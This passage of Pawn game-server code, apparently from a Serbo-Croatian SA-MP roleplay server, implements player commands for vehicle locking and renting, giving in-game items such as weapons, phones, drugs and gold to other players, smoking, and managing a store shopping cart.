	        SendErrorMessage( playerid, "Niste blizu vozila.");
	        return 1;
	    }
	}
	else vehicleid = GetPlayerVehicleID(playerid);

    if( VehicleInfo[ vehicleid ][ vUsage ] == PRIVATNO_VOZILO )
	{
        new slot = -1;
		for( new j = 0; j < MAX_VEH_SLOT; j ++ )
		{
			if( player_veh[ playerid ][ vehicle_id ][ j ] != -1 && player_veh[ playerid ][ vehicle_id ][ j ] == vehicleid ) 
			{
				slot = j;
				break;
			}
		}
		if( slot == -1 )
		{
			if( PlayerInfo[ playerid ][ xRezervniKljucevi ] == VehicleInfo[ vehicleid ][ vSqlID ] ) { }
			else if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) { }
			else return SendErrorMessage( playerid, "Nemate kljuceve ovog vozila." );
		}

		VehicleLockStatusChange( playerid, vehicleid, PRIVATNO_VOZILO );
	}
	else if( VehicleInfo[ vehicleid ][ vUsage ] == ORGANIZACIJSKO_VOZILO )
	{
		if( VehicleInfo[ vehicleid ][ vOrganization ] == PlayerInfo[ playerid ][ xClan ] || PlayerInfo[ playerid ][ xAdmin ] >= 1 )
		{
	    	VehicleLockStatusChange( playerid, vehicleid, ORGANIZACIJSKO_VOZILO );
        }
        else
		{
			SendErrorMessage( playerid, "Nemate kljuc ovog vozila.");
			return 1;
		}
	}
	else
	{
		SendErrorMessage( playerid, "Nemate kljuc ovog vozila.");
		return 1;
	}
	return 1;
}

CMD:unrent( playerid )
{
	if( RentVozilo[ playerid ] == -1 ) return SendErrorMessage( playerid, "Niste rentali vozilo.");
	if( GetPlayerInterior( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru." );
    if( GetPlayerVirtualWorld( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u virtual worldu." );

	VehicleObjectCheck( RentVozilo[ playerid ] );
    KillTimer(RentTimer[ playerid ]);
    VehicleInfo[ RentVozilo[ playerid ] ][ Validv3DText ] = false;
    DestroyDynamic3DTextLabel(VehicleInfo[ RentVozilo[ playerid ] ][ v3DText ]);
    ResetVehicle( RentVozilo[ playerid ] );
	SMG_DestroyVehicle( RentVozilo[ playerid ] );
	RentVozilo[ playerid ] = -1;

	SendClientMessage( playerid, ZUTA, "(RENT): Vise ne rentate vozilo.");
	return 1;
}

CMD:vozilo( playerid )
{
    new string[ 512 ];
    format( string, sizeof( string ), "Slot\tIme vozila\tID Vozila" );

	for( new j = 0; j < MAX_VEH_SLOT; j++ )
	{
		if( (j+1) <= PlayerInfo[ playerid ][ xSlotoviVozila ] )
		{
			if( player_veh[ playerid ][ vehicle_id ][ j ] != -1  )
			{
				format( string, sizeof( string ), "%s\n%d\t%s\t%d", string, j+1, getVehicleName( player_veh[ playerid ][ vehicle_id ][ j ] ), player_veh[ playerid ][ vehicle_id ][ j ] );
			}
	  		else format( string, sizeof( string ), "%s\n%d\tPRAZAN\t-1", string, j+1 );
		}
	}

	ShowPlayerDialog( playerid, dialog_VEHLIST, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV, string, "Odaberi", "Izlaz" );
	return 1;
}
alias:vozilo( "v" );

CMD:give( playerid, const params[] )
{
    new x_nr[15];
	if( sscanf( params, "s[15]{s[144]}", x_nr ) )
	{
		SendUsageMessage( playerid, "/give [opcija]");
		SendClientMessage( playerid, -1, "OPCIJE: gun | sat | telefon | cigare | upaljac | materials | drugs | gold");
		return 1;
	}

	new giveplayerid;
 	if(strcmp(x_nr,"gun",true) == 0) 
 	{
	    new kolicina;
    	if( sscanf( params, "{s[15]}ri", giveplayerid, kolicina ) ) return SendUsageMessage( playerid, "/give gun [playerid] [kolicina]");

        new Float:H; 
        GetPlayerHealth( playerid, H );
		if( H < 15.0 ) return SendErrorMessage( playerid, "Ne mozete dati oruzje, ako imate manje od 15HP." );
		if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Moras biti van vozila." );
		if( IsPlayerInAnyVehicle( giveplayerid ) ) return SendErrorMessage( playerid, "Igrac mora biti van vozila." );

		if( giveplayerid != INVALID_PLAYER_ID ) 
		{
  		    if( PlayerLogged[ giveplayerid ] == true ) 
  		    {
     			if( IsPlayerNearPlayer( 3.0, playerid, giveplayerid ) ) 
     			{
					new weapon = GetWeapon( playerid );

                    if( GetFactionType( playerid ) == ORG_TIP_VLADINA || GetFactionType( playerid ) == ORG_TIP_HITMAN ) {
				        SendErrorMessage( playerid, "PD/SD/HITMAN nema razloga davati oruzja!");
						return 1;
					}
					if( WARPInfo[ playerid ][ WARIgrac ] != -1 ) return SendErrorMessage( playerid, "Ne mozes ovo dok si u waru." );
                    if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes ovo dok si na dmu." );
					if( giveplayerid == playerid ) return SendErrorMessage( playerid, "Ne mozete sami sebi davati oruzje!");
					if( weapon == 0 ) return SendErrorMessage( playerid, "Nemate nijedno oruzje u ruci!");
					if( IsMeleeWeapon( weapon ) ) 
					{
					    RemovePlayerWeapon( playerid, weapon );

					    SendInfoMessage( playerid, "Dali ste %s %s .", ImeIgraca( giveplayerid ), WeapNames[ weapon ] );
						SendInfoMessage( giveplayerid, "%s vam je dao %s .", ImeIgraca( playerid ), WeapNames[ weapon ] );
					}
					else
					{
					    if( kolicina < 1 ) return SendErrorMessage( playerid, "Kolicina ne moze u minus.");
						if( kolicina > GetPlayerAmmo( playerid ) ) return SendErrorMessage( playerid, "Nemas toliko municije za dati." );

						new 
							mplayerid = GetPlayerAmmo( playerid ), 
							mnova = mplayerid - kolicina;

					    if( kolicina == GetPlayerAmmo( playerid ) ) 
					    {
					        RemovePlayerWeapon( playerid, weapon );
						}
					    else 
					    {
					        //if( GetWeapon( giveplayerid ) != GetWeapon( playerid ) ) return SendErrorMessage( playerid, "Igrac nema to oruzje u ruci (ako zelis ceo gun kucaj tacno metkova)." );
					        if( GetWeapon( giveplayerid ) != GetWeapon( playerid ) ) 
					        {
					        	GiveWeaponToPlayer(giveplayerid, weapon, kolicina);
					        }
                            SetWeaponAmmo( playerid, weapon, mnova );
						}

						SendInfoMessage( playerid, "Dali ste %s %s sa %d metaka .", ImeIgraca( giveplayerid ), WeapNames[ weapon ], kolicina );
						SendInfoMessage( giveplayerid, "%s vam je dao %s sa %d metaka.", ImeIgraca( playerid ), WeapNames[ weapon ], kolicina );
					}
					//GiveWeaponToPlayer( giveplayerid, weapon, kolicina );
					SetPlayerArmedWeapon( giveplayerid, weapon );

					SendNearbyMessage(playerid, 5.0, 0xC2A2DAFF, "* %s daje oruzje %s.", ImeIgraca( playerid ), ImeIgraca( giveplayerid ) );
				} 
				else SendErrorMessage( playerid, "Taj igrac nije blizu vas.");
			}
		} 
		else SendErrorMessage( playerid, "Taj igrac nije online.");
		return 1;
    }
	else if(strcmp(x_nr,"cigare",true) == 0)
	{
	    new moneys;
    	if( sscanf( params, "{s[15]}ui", giveplayerid, moneys ) ) return SendUsageMessage( playerid, "/give cigare [id] [kolicina]");

		if( PlayerLogged[ giveplayerid ] == true )
		{
  			if( giveplayerid != IPI )
  			{
     			if( IsPlayerNearPlayer( 3.0, playerid, giveplayerid ) )
	 			{
			    	if( giveplayerid == playerid) return SendErrorMessage( playerid, "Ne mozete sami sebi davati cigarete.");
	    			if( ( PlayerInfo[ giveplayerid ][ xCigare ] + moneys ) > 100 ) return SendErrorMessage( playerid, "Osoba moze najvise nositi 100 cigareta kod sebe.");

	    			if( moneys > 0 && PlayerInfo[ playerid ][ xCigare ] >= moneys )
					{
	    			    PlayerInfo[ giveplayerid ][ xCigare ] += moneys;
   	    				PlayerInfo[ playerid ][ xCigare ] -= moneys;
				        PlayerPlaySound( giveplayerid, 1052, 0.0, 0.0, 0.0 );

				    	SendNearbyMessage(playerid, 5.0, 0xC2A2DAFF, "* %s vadi kutiju cigareta i daje cigaretu %s.", ImeIgraca( playerid ), ImeIgraca( giveplayerid ) );

				        SendInfoMessage( playerid, "Dali ste {FFFFFF}%s {4282C0}cigara {FFFFFF}(%d).", ImeIgraca( giveplayerid ), moneys );
			     		SendInfoMessage( giveplayerid, "Primili ste {FFFFFF}(%d) {4282C0}cigareta od {FFFFFF}%s.", moneys, ImeIgraca( playerid ));
				    }
					else SendErrorMessage( playerid, "Nemate toliko cigareta kod sebe.");
				}
				else SendErrorMessage( playerid, "Taj igrac nije blizu vas.");
 			}
		}
		else SendErrorMessage( playerid, "Taj igrac nije online.");
		return 1;
    }
    else if(strcmp(x_nr,"upaljac",true) == 0)
	{
    	if( sscanf( params, "{s[15]}u", giveplayerid ) ) return SendUsageMessage( playerid, "/give upaljac [id]");
  		if( giveplayerid != IPI )
  		{
  		    if( PlayerLogged[ giveplayerid ] == true )
		  	{
     			if( IsPlayerNearPlayer(3.0, playerid, giveplayerid ) )
			 	{
			    	if( giveplayerid == playerid ) return SendErrorMessage( playerid, "Ne mozete sami sebi davati upaljac.");
	    			if( PlayerInfo[ giveplayerid ][ xUpaljac ] == 1 ) return SendErrorMessage( playerid, "Osoba vec ima upaljac.");

					if( PlayerInfo[ playerid ][ xUpaljac ] == 1 )
					{
	    				PlayerInfo[ playerid ][ xUpaljac ] = 0;
					    PlayerInfo[ giveplayerid ][ xUpaljac ] = 1;
				    	PlayerPlaySound( giveplayerid, 1052, 0.0, 0.0, 0.0 );

					    SendNearbyMessage(playerid, 5.0, 0xC2A2DAFF, "* %s vadi upaljac iz dzepa i daje ga %s.", ImeIgraca( playerid ), ImeIgraca( giveplayerid ) );
            		}
					else SendErrorMessage( playerid, "Nemas upaljac.");
				}
				else SendErrorMessage( playerid, "Taj igrac nije blizu vas.");
 			}
		}
		else SendErrorMessage( playerid, "Taj igrac nije online.");
		return 1;
    }
    else if(strcmp(x_nr,"telefon",true) == 0)
	{
    	if( sscanf(params, "{s[15]}u", giveplayerid ) ) return SendUsageMessage( playerid, "/give telefon [id]");
		if( PlayerLogged[ giveplayerid ] == true )
		{
  			if( giveplayerid != IPI )
  			{
     			if( IsPlayerNearPlayer(3.0, playerid, giveplayerid ) )
	 			{
			    	if( giveplayerid == playerid ) return SendErrorMessage( playerid, "Ne mozete sami sebi davati mobilni telefon.");
	    			if( PlayerInfo[ giveplayerid ][ xTelefon ] != 0 ) return SendErrorMessage( playerid, "Osoba vec ima mobilni.");

					if( PlayerInfo[ playerid ][ xTelefon ] != 0 )
					{
	    				PlayerInfo[ giveplayerid ][ xTelefon ] = PlayerInfo[ playerid ][ xTelefon ];
				    	PlayerPlaySound(giveplayerid, 1052, 0.0, 0.0, 0.0);

					    SendNearbyMessage(playerid, 5.0, 0xC2A2DAFF, "* %s daje mobilni telefon %s.", ImeIgraca( playerid ), ImeIgraca( giveplayerid ) );
			         	PlayerInfo[ playerid ][ xTelefon ] = 0;


			         	new q[ 144 ];
						mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `xTelefon` = '%d', `phone_number` = '%d' WHERE `user_id` = '%d' LIMIT 1",
															PlayerInfo[ playerid ][ xTelefon ], PlayerInfo[ playerid ][ xBrojTelefona ], PlayerInfo[ playerid ][ xID ] );
						mysql_tquery( mSQL, q );

			         	mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `xTelefon` = '%d', `phone_number` = '%d' WHERE `user_id` = '%d' LIMIT 1",
															PlayerInfo[ giveplayerid ][ xTelefon ], PlayerInfo[ giveplayerid ][ xBrojTelefona ], PlayerInfo[ giveplayerid ][ xID ] );
						mysql_tquery( mSQL, q );
            		}
					else SendErrorMessage( playerid, "Nemas mobilni.");
				}
				else SendErrorMessage( playerid, "Taj igrac nije blizu vas.");
 			}
		}
		else SendErrorMessage( playerid, "Taj igrac nije online.");
		return 1;
    }
	else if(strcmp(x_nr,"sat",true) == 0)
	{
    	if( sscanf(params, "{s[15]}u", giveplayerid ) ) return SendUsageMessage( playerid, "/give sat [id]");
  		if( giveplayerid != IPI )
		{
  			if( PlayerLogged[ giveplayerid ] == true )
  			{
     			if( IsPlayerNearPlayer(3.0, playerid, giveplayerid ) )
	 			{
			    	if( giveplayerid == playerid ) return SendErrorMessage( playerid, "Ne mozete sami sebi davati sat.");
	    			if( PlayerInfo[ giveplayerid ][ xSat ] != 0 ) return SendErrorMessage( playerid, "Osoba vec ima sat.");

					if( PlayerInfo[ playerid ][ xSat ] != 0 )
					{
	    				PlayerInfo[ giveplayerid ][ xSat ] = PlayerInfo[ playerid ][ xSat ];
	    				PlayerInfo[ playerid ][ xSat ] = 0;
				    	PlayerPlaySound( giveplayerid, 1052, 0.0, 0.0, 0.0);

					    SendNearbyMessage(playerid, 5.0, 0xC2A2DAFF, "* %s skida sat sa ruke i daje ga %s.", ImeIgraca( playerid ), ImeIgraca( giveplayerid ) );

			         	sql_user_update_integer( playerid, "watch", PlayerInfo[ playerid ][ xSat ] );
			         	sql_user_update_integer( giveplayerid, "watch", PlayerInfo[ giveplayerid ][ xSat ] );
            		}
					else SendErrorMessage( playerid, "Nemas sat.");
				}
				else SendErrorMessage( playerid, "Taj igrac nije blizu vas.");
 			}
		}
		else SendErrorMessage( playerid, "Taj igrac nije online.");
		return 1;
    }
    else if(strcmp(x_nr,"materials",true) == 0)
	{
	    new moneys, cijena;
    	if( sscanf( params, "{s[15]}uii", giveplayerid, moneys, cijena ) ) return SendUsageMessage( playerid, "/give materials [id] [kolicina] [cena]"), SendClientMessage(playerid, -1, "* Ako samo dajete upisite $0, ako prodajete upisite ukupnu cijenu.");

		if( PlayerLogged[ giveplayerid ] == true )
		{
  			if( giveplayerid != IPI )
			{
     			if( IsPlayerNearPlayer( 3.0, playerid, giveplayerid ) )
				{
			    	if( giveplayerid == playerid ) return SendErrorMessage( playerid, "Ne mozete sami sebi davati materijale.");
			    	if( cijena < 1 || cijena > 10000000 ) return SendErrorMessage( playerid, "Ne mozete ispod 1$ i preko 10.000.000$.");
			    	if( moneys < 1 || moneys > 100000 ) return SendErrorMessage( playerid, "Ne mozete ispod 1 i preko 100.000 matsa odjednom.");

	    			if( PlayerInfo[ playerid ][ xMaterijali ] >= moneys )
					{
					    ChosenItem[ giveplayerid ] = 1;
					    ItemPrice[ giveplayerid ] = cijena;
					    ItemQuantity[ giveplayerid ] = moneys;
					    GiveItemID[ giveplayerid ] = playerid;

			     		SendInfoMessage( playerid, "Ponudili ste {FFFFFF}%s {4282C0}materijala {FFFFFF}(%d) {4282C0}za {FFFFFF}($%d).", ImeIgraca( giveplayerid ), moneys, cijena );
			     		SendInfoMessage( giveplayerid, "Dobili ste ponudu {FFFFFF}(%d) {4282C0}materijala od {FFFFFF}%s {4282C0}za {FFFFFF}($%d).", moneys, ImeIgraca( playerid ), cijena);
			     		SendInfoMessage( giveplayerid, "Ukoliko zelite prihvatiti materijale upisite /accept mats.");
					}
					else SendErrorMessage( playerid, "Nemate toliko materijala kod sebe.");
				}
				else SendErrorMessage( playerid, "Taj igrac nije blizu vas.");
 			}
		}
		else SendErrorMessage( playerid, "Taj igrac nije online.");
		return 1;
    }
    else if(strcmp(x_nr,"drugs",true) == 0)
	{
	    new moneys, cijena;
    	if( sscanf( params, "{s[15]}uii", giveplayerid, moneys, cijena ) ) return SendUsageMessage( playerid, "/give drugs [id] [kolicina] [cena]"), SendClientMessage(playerid, -1, "* Ako samo dajete upisite $0, ako prodajete upisite ukupnu cijenu.");

		if( PlayerLogged[ giveplayerid ] == true )
		{
  			if( giveplayerid != IPI )
			{
     			if( IsPlayerNearPlayer( 3.0, playerid, giveplayerid ) )
				{
			    	if( giveplayerid == playerid ) return SendErrorMessage( playerid, "Ne mozete sami sebi davati materijale.");
			    	if( cijena < 1 || cijena > 10000000 ) return SendErrorMessage( playerid, "Ne mozete ispod $1 i preko $10.000.000!");
			    	if( moneys < 1 || moneys > 100000 ) return SendErrorMessage( playerid, "Ne mozete ispod 1 i preko 100.000 droge odjednom.");

	    			if( PlayerInfo[ playerid ][ xTorba_Droga ] >= moneys )
					{
					    ChosenItem[ giveplayerid ] = 2;
					    ItemPrice[ giveplayerid ] = cijena;
					    ItemQuantity[ giveplayerid ] = moneys;
					    GiveItemID[ giveplayerid ] = playerid;

			     		SendInfoMessage( playerid, "Ponudili ste {FFFFFF}%s {4282C0}droge {FFFFFF}(%d) {4282C0}za {FFFFFF}($%d).", ImeIgraca( giveplayerid ), moneys, cijena );
			     		SendInfoMessage( giveplayerid, "Dobili ste ponudu {FFFFFF}(%d) {4282C0}droge od {FFFFFF}%s {4282C0}za {FFFFFF}($%d).", moneys, ImeIgraca( playerid ), cijena);
			     		SendInfoMessage( giveplayerid, "Kucajte /accept drugs ako zelite prihvatiti drogu.");
					}
					else SendErrorMessage( playerid, "Nemate toliko droge kod sebe.");
				}
				else SendErrorMessage( playerid, "Taj igrac nije blizu vas.");
 			}
		}
		else SendErrorMessage( playerid, "Taj igrac nije online.");
		return 1;
    }
    else if(strcmp(x_nr,"gold",true) == 0)
	{
	    new moneys, cijena;
    	if( sscanf( params, "{s[15]}uii", giveplayerid, moneys, cijena ) ) return SendUsageMessage( playerid, "/give gold [id] [kolicina] [cena]"), SendClientMessage(playerid, -1, "* Ako samo dajete upisite $0, ako prodajete upisite ukupnu cijenu.");

		if( PlayerLogged[ giveplayerid ] == true )
		{
  			if( giveplayerid != IPI )
			{
     			if( IsPlayerNearPlayer( 3.0, playerid, giveplayerid ) )
				{
			    	if( giveplayerid == playerid ) return SendErrorMessage( playerid, "Ne mozete sami sebi davati materijale.");
			    	if( cijena < 1 || cijena > 10000000 ) return SendErrorMessage( playerid, "Ne mozete ispod 1$ i preko 10.000.000$.");
			    	if( moneys < 1 || moneys > 10000 ) return SendErrorMessage( playerid, "Ne mozete ispod 1 i preko 10.000 droge odjednom.");

	    			if( PlayerInfo[ playerid ][ xZlato ] >= moneys )
					{
					    ChosenItem[ giveplayerid ] = 3;
					    ItemPrice[ giveplayerid ] = cijena;
					    ItemQuantity[ giveplayerid ] = moneys;
					    GiveItemID[ giveplayerid ] = playerid;

			     		SendInfoMessage( playerid, "Ponudili ste {FFFFFF}%s {4282C0}zlato {FFFFFF}(%d) {4282C0}za {FFFFFF}($%d).", ImeIgraca( giveplayerid ), moneys, cijena );
			     		SendInfoMessage( giveplayerid, "Dobili ste ponudu {FFFFFF}(%d) {4282C0}zlata od {FFFFFF}%s {4282C0}za {FFFFFF}($%d).", moneys, ImeIgraca( playerid ), cijena);
			     		SendInfoMessage( giveplayerid, "Kucajte /accept gold ako zelite prihvatiti drogu.");
					}
					else SendErrorMessage( playerid, "Nemate toliko zlata kod sebe.");
				}
				else SendErrorMessage( playerid, "Taj igrac nije blizu vas.");
 			}
		}
		else SendErrorMessage( playerid, "Taj igrac nije online.");
		return 1;
    }
	return 1;
}

// 24/7 System
CMD:uzmicigaretu( playerid )
{
	if( PlayerInfo[ playerid ][ xCigare ] < 1) return SendErrorMessage( playerid, "Nemate cigareta.");

	if( PlayerInfo[ playerid ][ xUpaljac ] == 1)
	{
 		ApplyAnimation( playerid, "SMOKING", "M_smk_in", 3.0, 0, 0, 0, 0, 0, 1 );
 		SetPlayerSpecialAction( playerid, 21 );

		SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s pali cigaretu i pusi.", ImeIgraca( playerid ) );

  		SendClientMessage( playerid, 0x4282C0FF, "(CIGARA): Stisni {FFFFFF}'LIJEVI KLIK' {4282C0}da pocnes pusiti." );
   		SendClientMessage( playerid, 0x4282C0FF, "(CIGARA): Koristi tipku {FFFFFF}'ENTER' {4282C0}da bacis cigaretu." );

		gSmoking[playerid] = 1;
	  	PlayerInfo[ playerid ][ xCigare ] -= 1;
    }
	else SendErrorMessage( playerid, "Nemas upaljac!");
	return 1;
}

CMD:izbaci( playerid, const params[] )
{
    new item[32];
	if( sscanf( params, "s[32]", item))
	{
		SendUsageMessage( playerid, "/izbaci [opcija]");
     	SendClientMessage( playerid, -1, "OPCIJE: | pizza | uze | maska | sok | pivo | hamburger");
     	SendClientMessage( playerid, -1, "OPCIJE: | riba | cigare | upaljac | sat | vatromet");
		return 1;
	}
	if( strcmp( item, "pizza",true) == 0)
	{
	    if( UzeoIzMarketa[ playerid ][ 0 ] == 0 ) return SendErrorMessage( playerid, "Nemate picu u korpi za kupovinu." );

		UkupnaCena[ playerid ] -= 100;
		SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s levom rukom izbacuje picu iz korpe za kupovinu.", ImeIgraca( playerid ) );
		UzeoIzMarketa[ playerid ][ 0 ]--;
		return 1;
	}
	else if( strcmp( item, "uze",true) == 0)
	{
	    if( UzeoIzMarketa[ playerid ][ 1 ] == 0 ) return SendErrorMessage( playerid, "Nemate uze u korpi za kupovinu." );

		UkupnaCena[ playerid ] -= 200;
		SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s levom rukom izbacuje uze iz korpe za kupovinu.", ImeIgraca( playerid ) );
		UzeoIzMarketa[ playerid ][ 1 ] = 0;
	    return 1;
	}
	else if( strcmp( item, "maska",true) == 0)
	{
	    if( UzeoIzMarketa[ playerid ][ 2 ] == 0 ) return SendErrorMessage( playerid, "Nemate masku u korpi za kupovinu." );

		UkupnaCena[ playerid ] -= 800;
		SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s levom rukom izbacuje masku iz korpe za kupovinu.", ImeIgraca( playerid ) ); 
		UzeoIzMarketa[ playerid ][ 2 ] = 0;
	    return 1;
	}
	else if( strcmp( item, "sok",true) == 0)
	{
	    if( UzeoIzMarketa[ playerid ][ 3 ] == 0 ) return SendErrorMessage( playerid, "Nemate sok u korpi za kupovinu." );

		UkupnaCena[ playerid ] -= 40;
		SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s levom rukom izbacuje sok iz korpe za kupovinu.", ImeIgraca( playerid ) );
		UzeoIzMarketa[ playerid ][ 3 ] -= 1;
	    return 1;
	}
	else if( strcmp( item, "pivo",true) == 0)
	{
	    if( UzeoIzMarketa[ playerid ][ 4 ] == 0 ) return SendErrorMessage( playerid, "Nemate pivo u korpi za kupovinu." );

		UkupnaCena[ playerid ] -= 55;
		SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s levom rukom izbacuje pivo iz korpe za kupovinu.", ImeIgraca( playerid ) );
		UzeoIzMarketa[ playerid ][ 4 ] -= 1;
	    return 1;
	}
	else if( strcmp( item, "hamburger",true) == 0)
	{
	    if( UzeoIzMarketa[ playerid ][ 5 ] == 0 ) return SendErrorMessage( playerid, "Nemate hamburger u korpi za kupovinu." );

		UkupnaCena[ playerid ] -= 65;
		SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s levom rukom izbacuje hamburger iz korpe za kupovinu.", ImeIgraca( playerid ) );
		UzeoIzMarketa[ playerid ][ 5 ]--;
	    return 1;
	}
	else if( strcmp( item, "riba",true) == 0)
	{
	    if( UzeoIzMarketa[ playerid ][ 6 ] == 0 ) return SendErrorMessage( playerid, "Nemate kokosku u korpi za kupovinu." );

		UkupnaCena[ playerid ] -= 250;
		SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s levom rukom izbacuje ribu iz korpe za kupovinu.", ImeIgraca( playerid ) );
		UzeoIzMarketa[ playerid ][ 6 ]--;
	    return 1;
	}
	else if( strcmp( item, "cigare",true) == 0)
	{
	    if( UzeoIzMarketa[ playerid ][ 7 ] == 0 ) return SendErrorMessage( playerid, "Nemate cigare u korpi za kupovinu." );

		UkupnaCena[ playerid ] -= 35;
		SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s levom rukom izbacuje cigare iz korpe za kupovinu.", ImeIgraca( playerid ) );
		UzeoIzMarketa[ playerid ][ 7 ] = 0;
	    return 1;
	}
	else if( strcmp( item, "upaljac",true) == 0)
	{
	    if( UzeoIzMarketa[ playerid ][ 8 ] == 0 ) return SendErrorMessage( playerid, "Nemate upaljac u korpi za kupovinu." );

		UkupnaCena[ playerid ] -= 25;
		SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s levom rukom izbacuje upaljac iz korpe za kupovinu.", ImeIgraca( playerid ) );
		UzeoIzMarketa[ playerid ][ 8 ] = 0;
	    return 1;
	}
	else if( strcmp( item, "vatromet",true) == 0)
	{
	    if( UzeoIzMarketa[ playerid ][ 9 ] == 0 ) return SendErrorMessage( playerid, "Nemate vatromet u korpi za kupovinu." );

		UkupnaCena[ playerid ] -= 3500;
		SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s levom rukom izbacuje vatromet iz korpe za kupovinu.", ImeIgraca( playerid ) );
		UzeoIzMarketa[ playerid ][ 9 ]--;
	    return 1;
	}
	else
	{
		SendUsageMessage( playerid, "/izbaci [opcija]");
     	SendClientMessage( playerid, -1, "OPCIJE: | pizza | uze | maska | sok | pivo | hamburger");
     	SendClientMessage( playerid, -1, "OPCIJE: | riba | cigare | upaljac | sat");
   	}
	return 1;
}

CMD:ubaci( playerid, const params[] )
{
    new businessId = GetPlayerBusinessId( playerid, VRSTA_MARKET );

	if( businessId == -1 ) SendErrorMessage( playerid, "Morate biti u marketu da bi koristili ovu komandu." );
	else if( businessId == -2 ) SendErrorMessage( playerid, "Nemamo vise proizvoda!" );
	else 
	{
	    new item[ 32 ], kolicina;
		if( sscanf( params, "s[32]{s[144]}", item ) )
		{
			SendUsageMessage( playerid, "/ubaci [opcija]");
	     	SendClientMessage( playerid, -1, "OPCIJE: | pizza, uze, maska, sok, pivo, hamburger");
	     	SendClientMessage( playerid, -1, "OPCIJE: | riba, cigare, upaljac, sat, vatromet");
			return 1;
		}
		if( strcmp( item, "pizza", true) == 0)
		{
		    if( sscanf( params, "{s[32]}d", kolicina ) ) return SendUsageMessage( playerid, "/ubaci pizza [kolicina]");

			if( !IsPlayerInRangeOfPoint( playerid, 3.0, -14.8936,-85.8825,1003.5469 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti do standa sa picama." );
			if( kolicina < 1 || kolicina > 500 ) return SendErrorMessage( playerid, "Mozete staviti najvise 500 ovih stavki u korpu.");
			if(UzeoIzMarketa[playerid][0] >= 500) return SendErrorMessage( playerid, "Vec imate 500 pizza u korpi.");

			UkupnaCena[ playerid ] += kolicina*100;
			SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s levom rukom ubacuje %d pica u korpu za kupovinu.", ImeIgraca( playerid ), kolicina );
			UzeoIzMarketa[ playerid ][ 0 ] += kolicina;

			if(UzeoIzMarketa[playerid][0] > 500) UzeoIzMarketa[playerid][0] = 500, SendErrorMessage(playerid, "Ne mozete staviti vise od 500 pizza.");
			return 1;
		}
		else if( strcmp( item, "uze", true) == 0)
		{
		    if( UzeoIzMarketa[ playerid ][ 1 ] == 1 ) return SendErrorMessage( playerid, "Vec si ubacio uze." );
		    if( !IsPlayerInRangeOfPoint( playerid, 3.0, -19.8782,-81.7753,1003.5469 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti do standa sa uzetom." );

			UkupnaCena[ playerid ] += 200;
			SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s levom rukom ubacuje uze u korpu za kupovinu.", ImeIgraca( playerid ) );
			UzeoIzMarketa[ playerid ][ 1 ] = 1;
		    return 1;
		}
		else if( strcmp( item, "maska", true) == 0)
		{
		    if( UzeoIzMarketa[ playerid ][ 2 ] == 1 ) return SendErrorMessage( playerid, "Vec si ubacio masku." );
		    if( !IsPlayerInRangeOfPoint( playerid, 3.0, -19.8783,-77.0707,1003.5542 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti do standa sa maskama." );

			UkupnaCena[ playerid ] += 800;
			SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s levom rukom ubacuje masku u korpu za kupovinu.", ImeIgraca( playerid ) );
			UzeoIzMarketa[ playerid ][ 2 ] = 1;
		    return 1;
		}
		else if( strcmp( item, "sok", true) == 0)
		{
		    if( sscanf( params, "{s[32]}d", kolicina ) ) return SendUsageMessage( playerid, "/ubaci sok [kolicina]");
		    if( !IsPlayerInRangeOfPoint( playerid, 3.0, -25.0427,-74.3232,1003.5469 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti do standa sa sokovima." );
            if( kolicina < 1 || kolicina > 500 ) return SendErrorMessage( playerid, "Mozete staviti najvise 500 ovih stavki u korpu.");
			if(UzeoIzMarketa[playerid][3] >= 500) return SendErrorMessage( playerid, "Vec imate 500 sokova u korpi.");

			UkupnaCena[ playerid ] += kolicina*40;
			SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s levom rukom ubacuje %d flasica soka u korpu za kupovinu.", ImeIgraca( playerid ), kolicina ); 
			UzeoIzMarketa[ playerid ][ 3 ] += kolicina;

			if(UzeoIzMarketa[playerid][3] > 500) UzeoIzMarketa[playerid][3] = 500, SendErrorMessage(playerid, "Ne mozete staviti vise od 500 sokova.");
		    return 1;
		}
		else if( strcmp( item, "pivo", true) == 0)
		{
		    if( sscanf( params, "{s[32]}d", item, kolicina ) ) return SendUsageMessage( playerid, "/ubaci pivo [kolicina]");
		    if( !IsPlayerInRangeOfPoint( playerid, 3.0, -17.9551,-74.3143,1003.5542 ) ) return SendErrorMessage( playerid, "Da biste koristili ovu komandu morate biti do standa sa pivom." );
            if( kolicina < 1 || kolicina > 500 ) return SendErrorMessage( playerid, "Mozete staviti najvise 500 ovih stavki u korpu.");
			if(UzeoIzMarketa[playerid][4] >= 500) return SendErrorMessage( playerid, "Vec imate 500 piva u korpi.");

			UkupnaCena[ playerid ] += kolicina*55;
			SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s levom rukom ubacuje %d flasa piva u korpu za kupovinu.", ImeIgraca( playerid ), kolicina ); 
			UzeoIzMarketa[ playerid ][ 4 ] += kolicina;

